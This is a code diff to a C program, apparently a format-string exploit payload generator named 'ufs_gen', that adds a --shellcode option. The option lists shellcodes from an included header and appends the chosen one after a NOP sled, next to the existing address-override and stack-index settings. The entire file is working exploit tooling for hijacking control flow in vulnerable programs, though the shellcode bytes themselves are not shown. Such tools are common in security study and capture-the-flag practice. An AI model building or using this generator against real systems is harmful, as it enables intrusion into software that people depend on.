@@ -24,6 +24,7 @@
 #include <stdio.h>
 #include <getopt.h>
 
+#include "shellcodes.h"
 
 static unsigned char payload[4096];
 
@@ -48,6 +49,11 @@ static char *suffix_g = NULL;
 /* how many NOP bytes (0x90) shall we append before suffix */
 static int suffix_nops_g = 0;
 
+/* shall we display a menu with the possible shellcodes ? */
+static bool select_shellcode_g = false;
+
+static char *shellcode_g = NULL;
+
     __attribute__((noreturn))
 static void usage(const char *arg0)
 {
@@ -57,7 +63,9 @@ static void usage(const char *arg0)
     fputs(
             "ufs_gen "
             "[--prefix pfx] [--suffix sfx] [--sfxnops n]\n"
-            "        --override addr --with addr --stackidx idx\n", stderr);
+            "        --override addr --with addr --stackidx idx\n"
+            "        --shellcode\n"
+            , stderr);
 
     exit(EX_USAGE);
 }
@@ -82,16 +90,18 @@ static int parse_arguments(int argc, char *argv[])
             OPT_PREFIX,
             OPT_SUFFIX,
             OPT_SFX_NOPS,
+            OPT_SHELLCODE,
         };
 
         static struct option long_options[] = {
-            {"override", required_argument, 0, OPT_OVERRIDE},
-            {"with",     required_argument, 0, OPT_WITH},
-            {"stackidx", required_argument, 0, OPT_STACKIDX},
-            {"addrsize", required_argument, 0, OPT_ADDR_SIZE},
-            {"prefix",   required_argument, 0, OPT_PREFIX},
-            {"suffix",   required_argument, 0, OPT_SUFFIX},
-            {"sfxnops",  required_argument, 0, OPT_SFX_NOPS},
+            {"override",  required_argument, 0, OPT_OVERRIDE},
+            {"with",      required_argument, 0, OPT_WITH},
+            {"stackidx",  required_argument, 0, OPT_STACKIDX},
+            {"addrsize",  required_argument, 0, OPT_ADDR_SIZE},
+            {"prefix",    required_argument, 0, OPT_PREFIX},
+            {"suffix",    required_argument, 0, OPT_SUFFIX},
+            {"sfxnops",   required_argument, 0, OPT_SFX_NOPS},
+            {"shellcode", no_argument,       0, OPT_SHELLCODE},
         };
 
         int option_index;
@@ -130,6 +140,9 @@ static int parse_arguments(int argc, char *argv[])
                 break;
             case OPT_SFX_NOPS:
                 suffix_nops_g = atoi(optarg);
+                break;
+            case OPT_SHELLCODE:
+                select_shellcode_g = true;
                 break;
             default:
                 /*
@@ -198,6 +211,30 @@ int main(int argc, char *argv[])
         usage(argv[0]);
     }
 
+    if (select_shellcode_g) {
+        for (;;) {
+            char buffer[256];
+            int sel;
+
+            /* display the name of the common shellcodes */
+            for (int _i = 0; _i < SHELLCODE_COUNT; ++_i) {
+                fprintf(stderr, "%02d - %s\n", _i + 1, common_shellcodes_g[_i].name);
+            }
+            fputs("select a shellcode. CTRL-D for no shellcode: ", stderr);
+
+            if (fgets(buffer, sizeof(buffer), stdin) == NULL)
+                break;
+
+            /* check if the selection is valid */
+            sel = atoi(buffer);
+            if (sel <= 0 || sel > SHELLCODE_COUNT)
+                continue;
+
+            shellcode_g = common_shellcodes_g[sel - 1].payload;
+            break;
+        }
+    }
+
     if (prefix_g != NULL) {
         int len_pfx = strlen(prefix_g);
         int mod_len_pfx = len_pfx % address_size_g;
@@ -242,9 +279,21 @@ int main(int argc, char *argv[])
         ++idx_stack_g;
     }
 
-    fprintf(stderr, "NOP bytes are at offset %d (%#x)\n", i, i);
+    /* append the NOP bytes */
+    if (suffix_nops_g > 0) {
+        fprintf(stderr, "NOP bytes are at offset %d (%#x)\n", i, i);
+    }
     for (int nop = 0; nop < suffix_nops_g; ++nop) {
         payload[i++] = '\x90';
+    }
+
+    /* append the shellcode */
+    if (shellcode_g != NULL) {
+        fprintf(stderr, "shellcode is at offset %d (%#x)\n", i, i);
+        int len_shellcode = strlen(shellcode_g);
+
+        memcpy(payload + i, shellcode_g, len_shellcode);
+        i += len_shellcode;
     }
 
     if (suffix_g != NULL) {
